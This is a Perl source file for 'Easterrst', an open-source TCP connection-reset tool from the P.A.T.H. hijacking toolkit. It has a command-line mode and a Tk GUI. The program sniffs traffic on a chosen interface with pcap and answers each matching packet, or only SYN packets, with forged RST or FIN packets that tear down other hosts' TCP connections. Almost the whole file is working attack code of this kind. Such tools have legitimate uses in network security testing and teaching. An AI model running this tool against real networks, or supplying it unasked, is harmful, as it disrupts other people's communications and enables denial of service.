#!/usr/bin/perl

eval 'exec /usr/bin/perl  -S $0 ${1+"$@"}'
    if 0; # not running under some shell
# Advanced TCP-Connection-Resetter
#
# Author: stefan@krecher.de
# TheMidget
#
# Heavily updated by Bastian Ballmann [ Crazydj@chaostal.de ]
#
# Last Update: 24.07.2004
# 
# This program is free software; you can redistribute 
# it and/or modify it under the terms of the 
# GNU General Public License version 2 as published 
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will 
# be useful, but WITHOUT ANY WARRANTY; without even 
# the implied warranty of MERCHANTABILITY or FITNESS 
# FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details. 

###[ Loading Modules ]###

use path::config;   # P.A.T.H. config
use path::hijack;   # P.A.T.H. hijacking stuff
use Getopt::Std;    # Parsing parameter
use Net::Pcap;      # Sniffin around
use IO::Select;     # Watching pipes
use strict;         # Be strict

# Do you have X and Tk?
BEGIN
{
    eval{ require Tk; };              
    import Tk unless $@;
};


###[ Signal handlers ]###

# Kill child process on INT or KILL signal
$SIG{INT} = \&exit_prog;
$SIG{KILL} = \&exit_prog;


###[ Global variables ]###

# Hijacked connection
my $connection;

# Reset only SYN packets?
my $reset_syn = 0;

# Standard reset flag
my $reset_flag = "rst";

# Pcap filter
my $pcap;

# Watching pipe
my $watcher = new IO::Select;

# Pipes and pid of the child process
my ($read,$write,$pid);

# Global Tk objects
my ($top, $target_entry, $conn_entry, $port_entry, $device_entry, $reset, $synreset, $result);

# Parameter hash
my %args;

# Config object
my $cfg;


###[ MAIN PART ]###

# Are you root?
die "You must be root...\n\n" if($> != 0);

# User needs help
help() if($ARGV[0] eq "--help");

# Start GUI version?
if($ARGV[0] eq "--gui")
{
    draw_gui();
}
else
{
     # Parsing parameter
    getopts('h:c:f:p:i:t:SrF',\%args);
    start(%args);
}



###[ Subroutines ]###

# Start the process
sub start
{
    my %args = @_;

    # Create a new config object
    $cfg = path::config->new();
    exit(1) if($cfg->check(%args) == 1);
    about() unless($ARGV[0] eq "--gui");

    # Reset with FIN?
    $reset_flag = "fin" if($args{'F'});

    # Reset only SYN packets?
    $reset_syn = 1 if($args{S});

    # Redraw GUI
    if($ARGV[0] eq "--gui")
    {
	$result->insert('end'," * Started RST deamon\n");
	$result->see('end');
	$top->update();
    }

    # Create a pcap expression
    if($args{'f'} eq "")
    {
	$pcap = $cfg->pcap();
	$pcap .= "tcp";
    }
    else
    {
	$pcap = $args{'f'};
    }

    # Filter and reset information
    if($ARGV[0] eq "--gui")
    {
	$result->insert('end',"\nSniffing $pcap on " . $cfg->get_device . "\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "\n       Sniffing $pcap on " . $cfg->get_device . "\n";
    }

    if($reset_syn)
    {
	if($ARGV[0] eq "--gui")
	{
	    $result->insert('end',"Resetting only SYN packets with $reset_flag packets\n\n");
	    $result->see('end');
	    $top->update();
	}
	else
	{
	    print "       Resetting only SYN packets with $reset_flag packets\n\n";
	}
    }
    else
    {
	if($ARGV[0] eq "--gui")
	{
	    $result->insert('end',"Resetting all packets with $reset_flag packets\n\n");
	    $result->see('end');
	    $top->update();
	}
	else
	{
	    print "       Resetting all packets with $reset_flag packets\n\n";
	}
    }

    # Create a child process
    ($read,$write,$pid) = mkchild();

    # Add the read pipe to the watcher list
    $watcher->add($read);

    # Start sniffin
    while(1)
    {
	$top->update if $ARGV[0] eq "--gui";

	# The child process has got something for us
	if($watcher->can_read(1))
	{
	    my $msg = pipe_read($read);

	    # Oh damn! There was an error!
	    if($msg =~ /^\[err\]\s/)
	    {
		show_error($');
		last;
	    }

	    # Hehe. The kid has caught a packet
	    else
	    {
		process_pkt($msg);
	    }
	}
    }
}


# Child process sniffs traffic and returns the sniffed
# packets to the father process
sub mkchild
{
    my $pid;

    # Create pipes
    pipe(my $father_read, my $father_write) or die $!;
    pipe(my $child_read, my $child_write) or die $!;

    # Fork child process
    $pid = fork();
    die "Cannot fork()!\n$!\n" unless defined $pid;

    # Father process
    if($pid != 0)
    {
	# Close unused pipes of the father process
	close($father_read); close($child_write);
	return($child_read,$father_write,$pid);
    }

    # Child process
    else
    {
	# Close unused pipes of the child process
	close($father_write); close($child_read);

	# Create a pipe watcher
	my $child_watcher = new IO::Select;

	# Add the read pipe of the father to the watcher list
	$child_watcher->add($father_read);

	# Error buffer
	my $errbuf;
	
	# Open network interface
	my $pcap_dev = Net::Pcap::open_live($cfg->get_device, 1024, 1, 1500, \$errbuf);

	if(defined $pcap_dev)
	{
	    # Compile and set the filter
	    my ($net, $mask, $filter);
	    Net::Pcap::lookupnet($cfg->get_device, \$net, \$mask, \$errbuf);
	    Net::Pcap::compile($pcap_dev,\$filter,$pcap,0,$mask);
	    Net::Pcap::setfilter($pcap_dev,$filter);

	    # Start sniffin
	    while(1)
	    {
		if($child_watcher->can_read(1))
		{
		    my $msg = pipe_read($father_read);
		    exit(0) if $msg eq "KILL";
		}
		
		my %header;
		my $packet = Net::Pcap::next($pcap_dev, \%header);
		pipe_write($child_write,$packet);
		
	    }
	}
	else
	{
	    pipe_write($child_write,"[err] Error while opening device ".$cfg->get_device."!\n$errbuf");
	    return;
	}

    }
}



# Write data into a pipe
# Parameter: Pipe, Message
sub pipe_write
{
    my ($pipe,$msg) = @_;
    my $bytes = sprintf("0x%08x",length($msg));
    my $send = 0;
    while($send < length($msg)+10) { $send += syswrite($pipe,$bytes.$msg,length($msg)+10,$send); }
}

# Read data out of a pipe
# Parameter: Pipe
sub pipe_read
{
    my $pipe = shift;
    my ($bytes,$buffer,$msg);

    while(1)
    {
	sysread($pipe,$buffer,10);
	$bytes = hex($buffer) if $buffer ne "";
	last if $bytes > 0;
    }

    $buffer = 0;
    while($buffer < $bytes) { $buffer += sysread($pipe,$msg,$bytes-$buffer); }
    return $msg;
}


# Function "process_pkt($hdr, $pkt)" will be call for
# every sniffed packet
sub process_pkt 
{
    my $pkt = shift;

  # Redraw GUI
  $top->update() if($ARGV[0] eq "--gui");

  # Create a hijack object?
  if($connection)
  {
      $connection->update($pkt); 
  }
  else
  {
      $connection = path::hijack->new($pkt);
      return;
  }

  # Is this the RST flag set?
  # We wont reset RST packets ;)
  unless($connection->check_flag($pkt,"rst"))
  {
      if($reset_syn)
      {
	  # Is the SYN flag set?
	  if($connection->check_flag($pkt,"syn"))
	  {
	      unless($connection->check_flag($pkt,"ack"))
	      {
		  $connection->reset($reset_flag);
		  
		  if($ARGV[0] eq "--gui")
		  {
		      $result->insert('end',"Send $reset_flag packet. $connection->{src_ip}:$connection->{src_port} --> $connection->{dest_ip}:$connection->{dest_port} SEQ: $connection->{seqnum}\n");
		      $result->see('end');
		      $top->update();
		  }
		  else
		  {
		      print "Send $reset_flag packet. $connection->{src_ip}:$connection->{src_port} --> $connection->{dest_ip}:$connection->{dest_port} SEQ: $connection->{seqnum}\n";
		  }
	      }
	  }
      }
      else
      {
	  $connection->reset($reset_flag);
	  
	  if($ARGV[0] eq "--gui")
	  {
	      $result->insert('end',"Send " . uc($reset_flag) . " $connection->{src_ip}:$connection->{src_port} --> $connection->{dest_ip}:$connection->{dest_port} SEQ: $connection->{seqnum}\n");
	      $result->see('end');
	      $top->update();
	  }
	  else
	  {
	      print "Send " . uc($reset_flag) . " $connection->{src_ip}:$connection->{src_port} --> $connection->{dest_ip}:$connection->{dest_port} SEQ: $connection->{seqnum}\n";
	  }
      }
  }
}



# Print Usage
sub help
{
    my $error = shift;
    &about();

    if($error eq "toomuch")
    {
	print ">>>  Please choose either target or connection!\n\n";
    }

    print ">>> Usage: $0 -F -r -S -i <device> -p <port> -h <hosts> -c <connection> -f <pcap>\n\n";
    print "    -F: Reset connection via FIN packet\n";
    print "    -r: Reset connection via RST packet (default)\n";
    print "    -S: Reset only SYN packets\n";
    print "    --gui to load the gui version\n\n";
    exit(0);
}


# Print about
sub about
{
    print "\n\n      ---------:[ Advanced TCP-Connection-Resetter\n";
    print "      ---:[ Programmed by Bastian Ballmann and Stefan Krecher\n";    
    print "      " . "-" x 55 . "\n\n";
}


# Kill the child process and exit the program
sub exit_prog
{
    if(defined $pid)
    {
	pipe_write($write,"KILL");
	waitpid($pid,'-1');
    }

    exit(0);
}


###[ GUI code ]###

# Draw the GUI
sub draw_gui
{
    # Main window
    $top = MainWindow->new(-background => 'black', 
			   -foreground => 'green', 
			   -borderwidth => 2);
    $top->title('Easterrst -- Just a nice RST daemon');
    $top->option(add => '*background', 'black');
    $top->option(add => '*foreground', 'green');

    # Frames
    my $content = $top->Frame->pack(-side => 'top', -pady => 10, -padx => 10);
    my $configure = $top->Frame->pack(-side => 'top', -pady => 5, -padx => 10);
    my $left = $configure->Frame->pack(-side => 'left', -padx => 10);
    my $right = $configure->Frame->pack(-side => 'right', -padx => 10);
    my $toolbar = $top->Frame->pack(-side => 'bottom', -pady => 5, -padx => 10);
    my $result_frame = $top->Frame->pack(-side => 'bottom', -pady => 15, -padx => 10);

    my $down = $top->Frame->pack(-side => 'bottom', -padx => 10, -pady => 0);
    my $d_left = $down->Frame->pack(-side => 'left', -padx => 10);
    my $d_right = $down->Frame->pack(-side => 'right', -padx => 10);
    my $p = $d_right->Frame->pack(-side => 'top', -padx => 10);
    my $r = $d_right->Frame->pack(-side => 'top', -padx => 10);
    my $s = $d_right->Frame->pack(-side => 'top', -padx => 10);


    # Labels
    $content->Label(-text => '[ Easterrst -- Advanced RST daemon ]',
		    -border => 0)->pack(-pady => 5);

    $content->Label(-text => '[ Programmed by Bastian Ballmann and Stefan Krecher ]',
		    -border => 0)->pack(-pady => 5);



    # Configuration
    $left->Label(-text => 'Host:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $target_entry = $right->Entry(-background => '#3C3C3C',
				  -textvariable => \$args{'h'})->pack(-pady => 6);
    
    $left->Label(-text => 'Connection:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $conn_entry = $right->Entry(-background => '#3C3C3C',
				-textvariable => \$args{'c'})->pack(-pady => 6);

    $left->Label(-text => 'Port:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $port_entry = $right->Entry(-background => '#3C3C3C',
				-textvariable => \$args{'p'})->pack(-pady => 6);

    $left->Label(-text => 'Device:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $device_entry = $right->Entry(-background => '#3C3C3C',
				  -textvariable => \$args{'i'})->pack(-pady => 6);

    my $errbuf;
    $device_entry->insert(0,Net::Pcap::lookupdev(\$errbuf));
    
    $reset = 'rst';
    $d_left->Label(-text => 'Reset with',
		   -border => 0)->pack(-side => 'top', -pady => 7);

    $r->Radiobutton(-variable => \$reset,
		    -text => 'RST',
		    -value => 'rst',
		    -activebackground => 'black',
		    -activeforeground => 'red')->pack(-side => 'left', -pady => 6);

    $r->Radiobutton(-variable => \$reset,
		    -text => 'FIN',
		    -value => 'fin',
		    -activebackground => 'black',
		    -activeforeground => 'red')->pack(-side => 'left', -pady => 6);

    $synreset = 'off';
    
    $d_left->Label(-text => 'Reset only SYN',
		   -border => 0)->pack(-side => 'bottom', -pady => 10);

    $s->Radiobutton(-variable => \$synreset,
		    -text => 'Yes',
		    -value => 'on',
		    -activebackground => 'black',
		    -activeforeground => 'red')->pack(-side => 'left', -pady => 5, -padx => 5);

    $s->Radiobutton(-variable => \$synreset,
		    -text => 'No',
		    -value => 'off',
		    -activebackground => 'black',
		    -activeforeground => 'red')->pack(-side => 'left', -pady => 5, -padx => 5);


    # Toolbar
    $toolbar->Button(-text => 'Start RST daemon',
		     -activebackground => 'black',
		     -activeforeground => 'red',
		     -borderwidth => 0,
		     -border => 0,
		     -command => \&check_cfg)->pack(-side => 'left', -padx => 10);

    $toolbar->Button(-text => 'Stop RST daemon',
		     -activebackground => 'black',
		     -activeforeground => 'red',
		     -borderwidth => 0,
		     -border => 0,
		     -command => \&exit_prog)->pack(-side => 'right', -padx => 10);

    # Output
    $result_frame->Label(-text => 'Output',
			 -border => 0)->pack(-side => 'top', -pady => 10);
    
    $result = $result_frame->Scrolled('Text',
				      -border => 2,
				      -width => 57,
				      -height => 10)->pack(-side => 'bottom', -pady => 5);

    $result->configure(-scrollbars => 'e');
    
    MainLoop();
}



# Check the config
sub check_cfg
{
    if( (length($args{'h'}) > 0) && (path::config::check_ip($args{'h'}) == 1) ) 
    { 
	show_error("Bad address $args{'h'}"); return;
    }

    if( (length($args{'c'}) > 0) && (path::config::check_ip($args{'c'}) == 1) )
    {
	show_error("Bad address $args{'c'}"); return;
    }

    if( (length($args{'p'}) > 0) && ($args{'p'} <= 0) )
    {
	show_error("Port should be above 0"); return;
    }
    
    $args{'r'} = '' if($reset eq 'rst');
    $args{'F'} = '' if($reset eq 'fin');
    $args{'S'} = 1 if($synreset eq 'on');
    start(%args);
}


# Show Error Message
sub show_error
{
    my $msg =  shift;

    if($ARGV[0] eq "--gui")
    {
	my $error = $top->Toplevel;
	$error->title('Error');
	$error->option(add => '*background', 'black');
	$error->option(add => '*foreground', 'green');
	
	$error->Label(-text => $msg,
		      -border => '0')->pack(-padx => 10, -pady => 10, -side => 'top');
	
	$error->Button(-text => 'OK',
		       -activebackground => 'black',
		       -activeforeground => 'red',
		       -border => 0,
		       -command => sub { $error->destroy })->pack(-pady => 5, -side => 'bottom');
    }
    else
    {
	print "$msg\n";
    }
}

